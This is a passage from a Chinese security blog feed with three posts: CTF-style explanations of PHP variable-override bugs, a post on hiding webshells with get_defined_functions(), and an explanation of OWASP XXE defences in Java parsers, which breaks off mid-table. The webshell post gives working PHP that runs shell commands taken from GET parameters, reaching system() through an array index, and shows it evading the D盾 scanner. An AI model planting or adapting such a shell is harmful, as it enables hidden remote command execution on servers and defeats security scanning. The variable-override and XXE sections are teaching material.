class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="string">'oop'</span>;</span><br><span class="line">parse_str($_SERVER[<span class="string">"QUERY_STRING"</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($a == <span class="string">'mi1k7ea'</span>) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Hacked!"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Hello!"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/2019/06/20/PHP变量覆盖漏洞/5.png" alt=""></p><p>再来看到小题目：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($_GET[<span class="string">'id'</span>])) &#123;</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">die</span>();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">include</span> (<span class="string">'flag.php'</span>);</span><br><span class="line">$a = <span class="string">"www.mi1k7ea.com"</span>;</span><br><span class="line">$id = $_GET[<span class="string">'id'</span>];</span><br><span class="line">@parse_str($id);</span><br><span class="line"><span class="keyword">if</span> ($a[<span class="number">0</span>] != <span class="string">'QNKCDZO'</span> &amp;&amp; md5($a[<span class="number">0</span>]) == md5(<span class="string">'QNKCDZO'</span>)) &#123;</span><br><span class="line"><span class="keyword">echo</span> $flag;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">exit</span>(<span class="string">'so easy!'</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>是弱类型和变量覆盖的结合：</p><p><img src="/2019/06/20/PHP变量覆盖漏洞/6.png" alt=""></p><h2 id="0x05-mb-parse-str-变量覆盖"><a href="#0x05-mb-parse-str-变量覆盖" class="headerlink" title="0x05 mb_parse_str()变量覆盖"></a>0x05 mb_parse_str()变量覆盖</h2><p>mb_parse_str()函数用于解析GET/POST/COOKIE数据并设置全局变量，和parse_str()类似：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="string">'oop'</span>;</span><br><span class="line">mb_parse_str($_SERVER[<span class="string">"QUERY_STRING"</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($a == <span class="string">'mi1k7ea'</span>) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Hacked!"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Hello!"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="0x06-import-request-variables-变量覆盖"><a href="#0x06-import-request-variables-变量覆盖" class="headerlink" title="0x06 import_request_variables()变量覆盖"></a>0x06 import_request_variables()变量覆盖</h2><p>支持版本：PHP 4 &gt;= 4.1.0, PHP 5 &lt; 5.4.0</p><p>import_request_variables()函数将GET、POST、Cookies中的变量导入到全局。</p><p>函数定义如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bool import_request_variables (string $types [, string $prefix])</span><br></pre></td></tr></table></figure><p>$type代表要注册的变量，G代表GET，P代表POST，C代表COOKIE，第二个参数为要注册变量的前缀。</p><p>使用这个函数只用简单地指定类型即可，这里G指定导入GET请求中的变量：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="string">"0"</span>;</span><br><span class="line">import_request_variables(<span class="string">"G"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($a == <span class="number">1</span>) &#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"Fucked!"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"Nothing!"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/2019/06/20/PHP变量覆盖漏洞/7.png" alt=""></p><h2 id="0x07-导致的变量覆盖"><a href="#0x07-导致的变量覆盖" class="headerlink" title="0x07 $$导致的变量覆盖"></a>0x07 $$导致的变量覆盖</h2><p>$$即可变变量，一个可变变量获取了一个普通变量的值作为这个可变变量的变量名。</p><p><strong>\$与\$​\$的区别</strong></p><p>\$var是一个正常变量，名称为：var，存储任何值，如：string，integer，float等。</p><p>\$\$var是一个引用变量，用于存储\$var的值。</p><p>看个Demo就清楚了：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">$x = <span class="string">"mi1k7ea"</span>;</span><br><span class="line">$$x = <span class="number">666</span>;</span><br><span class="line"><span class="keyword">echo</span> $x.<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> $$x.<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> $mi1k7ea;</span><br><span class="line"><span class="comment">//也可以写到双引号中解析，输出结果一样</span></span><br><span class="line"><span class="comment">// echo "$x&lt;br/&gt;";</span></span><br><span class="line"><span class="comment">// echo "$&#123;$x&#125;&lt;br/&gt;";</span></span><br><span class="line"><span class="comment">// echo "$mi1k7ea";</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/2019/06/20/PHP变量覆盖漏洞/9.png" alt=""></p><p><strong>变量覆盖漏洞</strong></p><p>$$导致的变量覆盖问题在CTF代码审计题目中经常在foreach中出现，如以下的示例代码，使用foreach来遍历数组中的值，然后再将获取到的数组键名作为变量，数组中的键值作为变量的值。因此就产生了变量覆盖漏洞。：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">foreach</span> (<span class="keyword">array</span>(<span class="string">'_COOKIE'</span>,<span class="string">'_POST'</span>,<span class="string">'_GET'</span>) <span class="keyword">as</span> $_request)  </span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">foreach</span> ($$_request <span class="keyword">as</span> $_key=&gt;$_value)  </span><br><span class="line">    &#123;</span><br><span class="line">        $$_key=  $_value;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$id = <span class="keyword">isset</span>($id) ? $id : <span class="string">"test"</span>;</span><br><span class="line"><span class="keyword">if</span>($id === <span class="string">"mi1k7ea"</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"flag&#123;xxxxxxxxxx&#125;"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Nothing..."</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这里以GET、POST或COOKIE都能触发，传入id=mi1k7ea后，在foreach语句中，\$_key为id，\$_value为mi1k7ea，进而\$\$_key为$id，从而实现了变量覆盖：</p><p><img src="/2019/06/20/PHP变量覆盖漏洞/8.png" alt=""></p><p><strong>一道CTF题目</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"flag.php"</span>;</span><br><span class="line">$_403 = <span class="string">"Access Denied"</span>;</span><br><span class="line">$_200 = <span class="string">"Welcome Admin"</span>;</span><br><span class="line"><span class="keyword">if</span> ($_SERVER[<span class="string">"REQUEST_METHOD"</span>] != <span class="string">"POST"</span>)&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">"BugsBunnyCTF is here :p…"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( !<span class="keyword">isset</span>($_POST[<span class="string">"flag"</span>]) )&#123;</span><br><span class="line"><span class="keyword">die</span>($_403);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span> ($_GET <span class="keyword">as</span> $key =&gt; $value)&#123;</span><br><span class="line">$$key = $$value;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span> ($_POST <span class="keyword">as</span> $key =&gt; $value)&#123;</span><br><span class="line">$$key = $value;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( $_POST[<span class="string">"flag"</span>] !== $flag )&#123;</span><br><span class="line"><span class="keyword">die</span>($_403);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"This is your flag : "</span>. $flag . <span class="string">"\n"</span>;</span><br><span class="line"><span class="keyword">die</span>($_200);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到，有3个if语句和2个foreach语句。</p><p>在if语句中，第一个需要你是通过POST方式进行请求，第二个是需要POST一个flag参数过去，第三个是比较flag参数和包含进来的真正的flag是否相等。</p><p>在foreach语句中，第一个是可以将GET的参数进行变量覆盖，第二个是将POST的参数进行变量覆盖，但两个语句的处理是有点区别的即一个键值为\$\$value另一个为\$value。</p><p>这里整理一下思路：因为POST的参数必须为flag，则第二个foreach语句的\$key为flag，进而\$\$key为\$flag，从而得到\$flag的值为POST传递的flag参数的值；这里因为第二个foreach语句修改了\$flag原来的值为POST传递的flag参数的值，因而最后一个if语句的条件是恒不成立的，在其后的else代码块逻辑中echo输出出来的只能是修改了的\$flag的值即POST传递的flag参数的值而非原本的\$flag的值、接着输出\$_200变量的值；要想输出原本的\$flag的值，我们需要将原本的\$flag覆盖\$_200变量，因此在第一个foreach语句中通过GET输入_200=flag，从而得到的\$\$key为\$_200、\$\$value为\$flag，从而实现在修改\$flag的值之前将其覆盖到\$_200变量中。</p><p>验证一下：</p><p><img src="/2019/06/20/PHP变量覆盖漏洞/10.png" alt=""></p><h2 id="0x08-参考"><a href="#0x08-参考" class="headerlink" title="0x08 参考"></a>0x08 参考</h2><p><a href="https://www.jianshu.com/p/a4d782e91852" target="_blank" rel="noopener">CTF之php变量覆盖漏洞</a></p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="PHP" scheme="https://Mi1k7ea.github.com/categories/PHP/"/>
    
    
      <category term="Web安全" scheme="https://Mi1k7ea.github.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="PHP" scheme="https://Mi1k7ea.github.com/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>巧用get_defined_functions隐藏WebShell</title>
    <link href="https://Mi1k7ea.github.com/2019/06/09/%E5%B7%A7%E7%94%A8get-defined-functions%E9%9A%90%E8%97%8FWebShell/"/>
    <id>https://Mi1k7ea.github.com/2019/06/09/巧用get-defined-functions隐藏WebShell/</id>
    <published>2019-06-09T10:14:48.000Z</published>
    <updated>2019-06-09T13:13:20.063Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-get-defined-functions"><a href="#0x01-get-defined-functions" class="headerlink" title="0x01 get_defined_functions"></a>0x01 get_defined_functions</h2><p>支持的PHP版本：PHP 4&gt; = 4.0.4，PHP 5，PHP 7</p><p>get_defined_functions：返回一个包含所有已定义函数的数组。</p><p>函数定义如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">get_defined_functions ([ bool $exclude_disabled = FALSE ] ) : array</span><br></pre></td></tr></table></figure><p>Demo</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$arr = get_defined_functions();</span><br><span class="line">print_r($arr);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>访问会输出以下内容：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Array</span></span><br><span class="line">(</span><br><span class="line">    [internal] =&gt; <span class="keyword">Array</span></span><br><span class="line">        (</span><br><span class="line">            [<span class="number">0</span>] =&gt; zend_version</span><br><span class="line">            [<span class="number">1</span>] =&gt; func_num_args</span><br><span class="line">            [<span class="number">2</span>] =&gt; func_get_arg</span><br><span class="line">            [<span class="number">3</span>] =&gt; func_get_args</span><br><span class="line">            ...</span><br><span class="line">            [<span class="number">459</span>] =&gt; exec</span><br><span class="line">            [<span class="number">460</span>] =&gt; system</span><br><span class="line">            [<span class="number">461</span>] =&gt; escapeshellcmd</span><br><span class="line">            [<span class="number">462</span>] =&gt; escapeshellarg</span><br><span class="line">            [<span class="number">463</span>] =&gt; passthru</span><br><span class="line">            [<span class="number">464</span>] =&gt; shell_exec</span><br><span class="line">            ...</span><br><span class="line">            [<span class="number">1910</span>] =&gt; xdebug_get_headers</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">    [user] =&gt; <span class="keyword">Array</span></span><br><span class="line">        (</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>返回一个多维数组，其中包含所有已定义函数的列表，包括内置（内部）和用户定义。内部函数可以通过\$arr[“internal”]访问，用户定义的函数可以使用\$arr[“user”]访问。</p><p>这里可以看到，system()函数在internal数组的下标为460，通过\$arr[“internal”][460]即可访问。</p><h2 id="0x02-隐藏WebShell"><a href="#0x02-隐藏WebShell" class="headerlink" title="0x02 隐藏WebShell"></a>0x02 隐藏WebShell</h2><p>利用get_defined_functions()函数，我们可以通过数组下标来访问的方式实现调用危险函数而无需输入一些敏感危险函数的字符串，从而实现Bypass一些利用正则表达式去文件系统及网络流量上匹配危险函数的安全防护。</p><h3 id="常规版"><a href="#常规版" class="headerlink" title="常规版"></a>常规版</h3><p>自定义了一个callfunc()函数，将system()函数以索引460传入，并在call_user_func_array()函数执行：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">callfunc</span><span class="params">()</span> </span>&#123;</span><br><span class="line">$func = get_defined_functions(); <span class="comment">//函数自己完成所有函数的枚举，成为list</span></span><br><span class="line">$args = func_get_args(); <span class="comment">//获取传入参数值</span></span><br><span class="line">$func_id = array_shift($args); <span class="comment">//获取传入的函数所代表的list key</span></span><br><span class="line">$func_name = $func[<span class="string">'internal'</span>][$func_id]; <span class="comment">//以key来索引函数名</span></span><br><span class="line"><span class="keyword">return</span> call_user_func_array($func_name, $args); <span class="comment">//调用回调函数，传参执行</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> callfunc(<span class="number">460</span>, <span class="string">"whoami"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>其中func_get_args()函数返回一个包含函数参数列表的数组；array_shift()函数将数组开头的单元移出数组。</p><p>访问即可执行shell：</p><p><img src="/2019/06/09/巧用get-defined-functions隐藏WebShell/1.png" alt=""></p><p>看下免杀效果吧，用D盾是扫不出来的：</p><p><img src="/2019/06/09/巧用get-defined-functions隐藏WebShell/2.png" alt=""></p><h3 id="变体版"><a href="#变体版" class="headerlink" title="变体版"></a>变体版</h3><p>按照这个套路我们继续将func_get_args()、array_shift()、call_user_func_array()也用get_defined_functions()函数来调用：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">callfunc</span><span class="params">()</span> </span>&#123;</span><br><span class="line">$func = get_defined_functions();</span><br><span class="line">$args = $func[<span class="string">'internal'</span>][<span class="number">3</span>](); <span class="comment">//func_get_args()</span></span><br><span class="line">$func_id = $func[<span class="string">'internal'</span>][<span class="number">805</span>]($args); <span class="comment">//array_shift()</span></span><br><span class="line">$func_name = $func[<span class="string">'internal'</span>][$func_id];</span><br><span class="line"><span class="keyword">return</span> $func[<span class="string">'internal'</span>][<span class="number">556</span>]($func_name, $args); <span class="comment">//call_user_func_array()</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> callfunc(<span class="number">460</span>, <span class="string">"whoami"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>D盾扫下，好像变复杂就被识别为可疑文件了呢：</p><p><img src="/2019/06/09/巧用get-defined-functions隐藏WebShell/3.png" alt=""></p><p>当然，我们可以简化一下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span><span class="params">()</span> </span>&#123;</span><br><span class="line">$a = get_defined_functions()[<span class="string">'internal'</span>];</span><br><span class="line">$s = $a[<span class="number">3</span>](); <span class="comment">//func_get_args()</span></span><br><span class="line">$b = $a[<span class="number">805</span>]($s); <span class="comment">//array_shift()</span></span><br><span class="line">$c = $a[$b];</span><br><span class="line"><span class="keyword">return</span> $a[<span class="number">556</span>]($c, $s); <span class="comment">//call_user_func_array()</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> f(<span class="number">460</span>, <span class="string">"whoami"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>D盾再扫下看看，虽然疑似点不一样，但还是识别为了可疑文件：</p><p><img src="/2019/06/09/巧用get-defined-functions隐藏WebShell/4.png" alt=""></p><h3 id="最终版"><a href="#最终版" class="headerlink" title="最终版"></a>最终版</h3><p>在变体版的基础上，修改为GET获取参数即可：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span><span class="params">()</span> </span>&#123;</span><br><span class="line">$a = get_defined_functions()[<span class="string">'internal'</span>];</span><br><span class="line">$s = $a[<span class="number">3</span>]();</span><br><span class="line">$b = $a[<span class="number">805</span>]($s);</span><br><span class="line">$c = $a[$b];</span><br><span class="line"><span class="keyword">return</span> $a[<span class="number">556</span>]($c, $s);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> f($_GET[<span class="string">'id'</span>], $_GET[<span class="string">'cmd'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>URL传参方便多了：</p><p><img src="/2019/06/09/巧用get-defined-functions隐藏WebShell/5.png" alt=""></p><p>D盾还是识别为可疑文件，可自行进行其他的变形。</p><p>当然，换成原版的是Bypass D盾的：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span><span class="params">()</span> </span>&#123;</span><br><span class="line">$a = get_defined_functions()[<span class="string">'internal'</span>];</span><br><span class="line">$b = func_get_args();</span><br><span class="line">$c = array_shift($b);</span><br><span class="line">$d = $a[$c];</span><br><span class="line"><span class="keyword">return</span> call_user_func_array($d, $b);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> f($_GET[<span class="string">'id'</span>], $_GET[<span class="string">'cmd'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="0x03-参考"><a href="#0x03-参考" class="headerlink" title="0x03 参考"></a>0x03 参考</h2><p><a href="https://www.php.net/manual/en/function.get-defined-functions.php" target="_blank" rel="noopener">get_defined_functions</a></p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="PHP" scheme="https://Mi1k7ea.github.com/categories/PHP/"/>
    
    
      <category term="Web安全" scheme="https://Mi1k7ea.github.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="PHP" scheme="https://Mi1k7ea.github.com/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>探讨XXE防御之setFeature设置</title>
    <link href="https://Mi1k7ea.github.com/2019/06/09/%E6%8E%A2%E8%AE%A8XXE%E9%98%B2%E5%BE%A1%E4%B9%8BsetFeature%E8%AE%BE%E7%BD%AE/"/>
    <id>https://Mi1k7ea.github.com/2019/06/09/探讨XXE防御之setFeature设置/</id>
    <published>2019-06-09T01:58:56.000Z</published>
    <updated>2019-06-15T01:21:19.524Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-setFeature小谈"><a href="#0x01-setFeature小谈" class="headerlink" title="0x01 setFeature小谈"></a>0x01 setFeature小谈</h2><h3 id="setFeature"><a href="#setFeature" class="headerlink" title="setFeature()"></a>setFeature()</h3><p>当我们使用DOM document builder或者SAX parser来解析XML格式的内容时，我们可以使用setFeature()来把一个特性设置为true或者false，从而打开或者关闭这个特性。而对于XXE的防御，正是设置相关feature的开关来实现的。</p><h3 id="OWASP推荐的XXE防御"><a href="#OWASP推荐的XXE防御" class="headerlink" title="OWASP推荐的XXE防御"></a>OWASP推荐的XXE防御</h3><p>以DocumentBuilder的XXE为例，具体代码可看<a href="https://www.mi1k7ea.com/2019/02/13/XML%E6%B3%A8%E5%85%A5%E4%B9%8BDocumentBuilder/" target="_blank" rel="noopener">《XML注入之DocumentBuilder与XXE攻击防御&gt;</a>，这里只看下之前示例的XXE防御的setFeature()是设置了哪些特性：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">factory.setFeature(<span class="string">"http://apache.org/xml/features/disallow-doctype-decl"</span>, <span class="keyword">true</span>);</span><br><span class="line">factory.setFeature(<span class="string">"http://xml.org/sax/features/external-general-entities"</span>, <span class="keyword">false</span>);</span><br><span class="line">factory.setFeature(<span class="string">"http://xml.org/sax/features/external-parameter-entities"</span>, <span class="keyword">false</span>);</span><br><span class="line">factory.setFeature(<span class="string">"http://apache.org/xml/features/nonvalidating/load-external-dtd"</span>, <span class="keyword">false</span>);</span><br></pre></td></tr></table></figure><p>以上设置的4个特性源自OWASP的建议，参考自<a href="https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.md" target="_blank" rel="noopener">《XML_External_Entity_Prevention_Cheat_Sheet》</a>，原文解释如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// This is the PRIMARY defense. If DTDs (doctypes) are disallowed, almost all </span></span><br><span class="line"><span class="comment">// XML entity attacks are prevented</span></span><br><span class="line"><span class="comment">// Xerces 2 only - http://xerces.apache.org/xerces2-j/features.html#disallow-doctype-decl</span></span><br><span class="line">FEATURE = <span class="string">"http://apache.org/xml/features/disallow-doctype-decl"</span>;</span><br><span class="line">dbf.setFeature(FEATURE, <span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// If you can't completely disable DTDs, then at least do the following:</span></span><br><span class="line"><span class="comment">// Xerces 1 - http://xerces.apache.org/xerces-j/features.html#external-general-entities</span></span><br><span class="line"><span class="comment">// Xerces 2 - http://xerces.apache.org/xerces2-j/features.html#external-general-entities</span></span><br><span class="line"><span class="comment">// JDK7+ - http://xml.org/sax/features/external-general-entities</span></span><br><span class="line">FEATURE = <span class="string">"http://xml.org/sax/features/external-general-entities"</span>;</span><br><span class="line">dbf.setFeature(FEATURE, <span class="keyword">false</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Xerces 1 - http://xerces.apache.org/xerces-j/features.html#external-parameter-entities</span></span><br><span class="line"><span class="comment">// Xerces 2 - http://xerces.apache.org/xerces2-j/features.html#external-parameter-entities</span></span><br><span class="line"><span class="comment">// JDK7+ - http://xml.org/sax/features/external-parameter-entities</span></span><br><span class="line">FEATURE = <span class="string">"http://xml.org/sax/features/external-parameter-entities"</span>;</span><br><span class="line">dbf.setFeature(FEATURE, <span class="keyword">false</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Disable external DTDs as well</span></span><br><span class="line">FEATURE = <span class="string">"http://apache.org/xml/features/nonvalidating/load-external-dtd"</span>;</span><br><span class="line">dbf.setFeature(FEATURE, <span class="keyword">false</span>);</span><br></pre></td></tr></table></figure><p>下面细看下以上几个特性。</p><h3 id="几个重要的feature"><a href="#几个重要的feature" class="headerlink" title="几个重要的feature"></a>几个重要的feature</h3><h4 id="disallow-doctype-decl"><a href="#disallow-doctype-decl" class="headerlink" title="disallow-doctype-decl"></a>disallow-doctype-decl</h4><p>防御XXE的最重要的特性，将该特性设置成true后，几乎所有的XML实体攻击都会被成功防御。</p><p><strong><a href="http://apache.org/xml/features/disallow-doctype-decl" target="_blank" rel="noopener">http://apache.org/xml/features/disallow-doctype-decl</a></strong></p><table><thead><tr><th><strong>True:</strong></th><th>A fatal error is thrown if the incoming document contains a DOCTYPE declaration.</th></tr></thead><tbody><tr><td><strong>False:</strong></td><td>DOCTYPE declaration is allowed.</td></tr><tr><td><strong>Default:</strong></td><td>false</td></tr><tr><td><strong>Since:</strong></td><td>Xerces-J 